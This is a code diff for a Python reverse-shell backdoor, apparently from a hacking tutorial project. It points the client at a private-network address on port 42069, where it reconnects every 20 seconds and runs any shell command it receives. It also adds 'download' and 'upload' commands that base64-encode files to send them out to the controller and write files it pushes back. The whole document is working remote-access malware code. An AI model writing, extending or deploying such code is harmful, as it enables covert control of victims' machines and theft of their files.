@@ -7,6 +7,7 @@ import time
 import shutil
 import os
 import sys # Needed for working of shutil
+import base64
 
 def reliable_send(data):
         json_data = json.dumps(data)
@@ -25,7 +26,7 @@ def connection():
 	while True:
 		time.sleep(20)
 		try:
-			s.connect(("127.0.0.1", 42069))
+			s.connect(("10.0.2.15", 42069))
 			shell()
 			break
 		except:
@@ -47,6 +48,13 @@ def shell():
 				os.chdir(command[3:])
 			except:
 				continue
+		elif command[0:8] == 'download':
+			file = open(command[9:], "rb")
+			reliable_send(base64.b64encode(file.read()))
+		elif command[0:6] == 'upload':
+			file = open(command[7:], "wb")
+			result = reliable_recv()
+			file.write(base64.b64decode(result))
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
